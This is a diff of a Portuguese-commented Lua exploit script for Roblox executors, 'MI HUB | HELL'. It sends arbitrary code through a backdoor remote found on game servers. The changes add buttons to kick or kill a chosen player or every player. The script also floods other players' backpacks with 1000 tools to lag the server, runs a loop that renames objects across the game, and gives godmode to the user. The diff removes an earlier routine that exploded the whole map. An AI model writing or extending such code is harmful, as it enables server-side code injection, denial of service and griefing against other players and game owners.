@@ -1,5 +1,5 @@
 -- language: Lua, target: Roblox (executor)
--- MI HUB | HELL — Backdoor Nativa (Sem novos remotes)
+-- MI HUB | HELL — Backdoor Nativa, Cripto Server-Side puro, Lag e Godmode
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -128,32 +128,66 @@ tabExec:CreateButton({
 })
 
 -- ==========================================
--- ABA 2: SERVER
+-- ABA 2: ADMIN
 -- ==========================================
-local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
-local grpServer = tabServer:CreateGroup({Name = "Destruicao Server-Side"})
+local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
+local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
 
-grpServer:CreateButton({Name = "Explodir Mapa Inteiro", Icon = "bomb", Callback = function()
+grpPlayer:CreatePlayerList({
+    Name = "Jogadores",
+    Height = 120,
+    Multi = false,
+    Callback = function(player) if player then selectedTarget = player.Name end end,
+})
+grpPlayer:CreateButton({Name = "Selecionar Todos ALL", Icon = "users", Callback = function() selectedTarget = "ALL" end})
+
+tabAdmin:CreateSpacer(10)
+local grpAcoes = tabAdmin:CreateGroup({Name = "Acoes Via Backdoor"})
+
+local function sendCmd(cmd, args)
     if not backdoorRemote then
         win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
-        return
+        return false
     end
-    local code = [[
-        for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("BasePart") then
-                local ex = Instance.new("Explosion")
-                ex.Position = v.Position
-                ex.BlastRadius = 40
-                ex.BlastPressure = 800000
-                ex.Parent = workspace
-            end
-        end
-    ]]
+    local code = ""
+    if cmd == "kick" then
+        code = string.format([[local p = game.Players:FindFirstChild("%s") if p then p:Kick("%s") end]], args.target, args.reason or "Kicked by MI HUB")
+    elseif cmd == "kill" then
+        code = string.format([[local p = game.Players:FindFirstChild("%s") if p and p.Character then p.Character:BreakJoints() end]], args.target)
+    end
     pcall(function()
         if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code)
         else backdoorRemote:InvokeServer(code) end
     end)
+    win:Notify({Title = "Enviado", Content = "Comando despachado.", Duration = 2})
+    return true
+end
+
+grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function()
+    if selectedTarget == "ALL" then
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP then pcall(function() p:Kick("Kicked by MI HUB") end) end
+        end
+    else
+        sendCmd("kick", {target = selectedTarget})
+    end
 end})
+
+grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function()
+    if selectedTarget == "ALL" then
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then pcall(function() p.Character:BreakJoints() end) end
+        end
+    else
+        sendCmd("kill", {target = selectedTarget})
+    end
+end})
+
+-- ==========================================
+-- ABA 3: SERVER
+-- ==========================================
+local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
+local grpServer = tabServer:CreateGroup({Name = "Destruicao"})
 
 -- LAG SERVER ALL
 grpServer:CreateButton({Name = "Lag Server Todos Menos Eu", Icon = "zap", Callback = function()
@@ -164,36 +198,26 @@ grpServer:CreateButton({Name = "Lag Server Todos Menos Eu", Icon = "zap", Callba
 
     local code = string.format([[
         local owner = "%s"
-        local function dumpTools(plr)
-            if not plr or plr.Name == owner then return end
-            local bp = plr:FindFirstChild("Backpack")
-            if not bp then return end
-            local template = nil
-            for _, t in ipairs(bp:GetChildren()) do
-                if t:IsA("Tool") then template = t break end
-            end
-            if not template then
-                template = Instance.new("Tool")
-                template.Name = "MI_TOOL"
-                template.RequiresHandle = true
-                local h = Instance.new("Part")
-                h.Name = "Handle"
-                h.Size = Vector3.new(3, 3, 3)
-                h.Material = Enum.Material.Neon
-                h.CanCollide = false
-                h.Parent = template
-            end
-            for i = 1, 1000 do
-                pcall(function()
-                    local clone = template:Clone()
-                    clone.Name = "MI_" .. i .. "_" .. math.random(1000, 9999)
-                    clone.Parent = bp
-                end)
-            end
-        end
-
         for _, p in ipairs(game.Players:GetPlayers()) do
-            if p.Name ~= owner then dumpTools(p) end
+            if p.Name ~= owner then
+                local bp = p:FindFirstChild("Backpack")
+                if bp then
+                    local tool = Instance.new("Tool")
+                    tool.Name = "MI_LAG"
+                    tool.RequiresHandle = true
+                    local h = Instance.new("Part")
+                    h.Name = "Handle"
+                    h.Size = Vector3.new(5, 5, 5)
+                    h.Transparency = 1
+                    h.CanCollide = false
+                    h.Parent = tool
+                    for i = 1, 1000 do
+                        local c = tool:Clone()
+                        c.Name = "LAG_" .. i
+                        c.Parent = bp
+                    end
+                end
+            end
         end
     ]], ownerName)
 
@@ -204,7 +228,7 @@ grpServer:CreateButton({Name = "Lag Server Todos Menos Eu", Icon = "zap", Callba
     win:Notify({Title = "Lag Server", Content = "1000 tools para todos menos voce.", Duration = 3})
 end})
 
--- CRYPTO SERVER TOTAL (Nativo via Backdoor)
+-- CRIPTO SERVER TUDO (O que funcionava antes)
 grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default = false, Callback = function(state)
     if not backdoorRemote then
         win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
@@ -212,7 +236,6 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
     end
 
     if state then
-        -- Remove todas as travas e limitações que impediam o rename
         local code = string.format([[
             _G.MI_Crypto = true
             local owner = "%s"
@@ -229,7 +252,6 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
 
             task.spawn(function()
                 while _G.MI_Crypto do
-                    -- 1. Varre TUDO no jogo
                     local function forceRename(obj)
                         if not obj then return end
                         pcall(function()
@@ -242,17 +264,11 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
                         end
                     end
 
-                    -- Executa no Workspace
                     forceRename(workspace)
-                    -- Executa nos serviços
-                    for _, svc in ipairs(game:GetChildren()) do
-                        if svc:IsA("Folder") or svc:IsA("DataModel") then
-                            -- Força nos que são seguros
-                        elseif svc.Name == "Lighting" or svc.Name == "ReplicatedStorage" or svc.Name == "StarterGui" then
-                            forceRename(svc)
-                        end
-                    end
-                    -- Executa nos Jogadores
+                    forceRename(game:GetService("Lighting"))
+                    forceRename(game:GetService("ReplicatedStorage"))
+                    forceRename(game:GetService("StarterGui"))
+                    
                     for _, plr in ipairs(game.Players:GetPlayers()) do
                         if plr.Name ~= owner then
                             forceRename(plr)
@@ -281,7 +297,7 @@ grpServer:CreateToggle({Name = "CRIPTO SERVER TUDO", Icon = "terminal", Default 
 end})
 
 -- ==========================================
--- ABA 3: UTILIDADES — GODMODE + ANTI LAG
+-- ABA 4: UTILIDADES
 -- ==========================================
 local tabUtil = win:CreateTab({Name = "Utilidades", Icon = "settings"})
 local grpUtil = tabUtil:CreateGroup({Name = "Server-Side"})
@@ -309,19 +325,9 @@ grpUtil:CreateToggle({
                             local char = plr.Character
                             local h = char:FindFirstChildOfClass("Humanoid")
                             if h then
-                                pcall(function()
-                                    h.MaxHealth = math.huge
-                                    h.Health = math.huge
-                                    h.BreakJointsOnDeath = false
-                                end)
-                            end
-                            local root = char:FindFirstChild("HumanoidRootPart")
-                            if root then
-                                for _, v in ipairs(root:GetChildren()) do
-                                    if v:IsA("BodyVelocity") or v:IsA("BodyForce") or v:IsA("BodyThrust") then
-                                        v:Destroy()
-                                    end
-                                end
+                                h.MaxHealth = math.huge
+                                h.Health = math.huge
+                                h.BreakJointsOnDeath = false
                             end
                         end
                         task.wait(0.05)
@@ -345,7 +351,7 @@ grpUtil:CreateToggle({
     end,
 })
 
--- ANTI LAG SERVER SIDE ONLY
+-- ANTI LAG SERVER SIDE
 grpUtil:CreateToggle({
     Name = "Anti Lag Server Side",
     Icon = "shield",
@@ -405,4 +411,4 @@ grpUtil:CreateToggle({
     end,
 })
 
-grpUtil:CreateLabel({Name = "Anti lag server-side limpa e pune laggers. Godmode te mantem imortal."})
+grpUtil:CreateLabel({Name = "Cripto server puro, lag para todos, godmode imortal."})
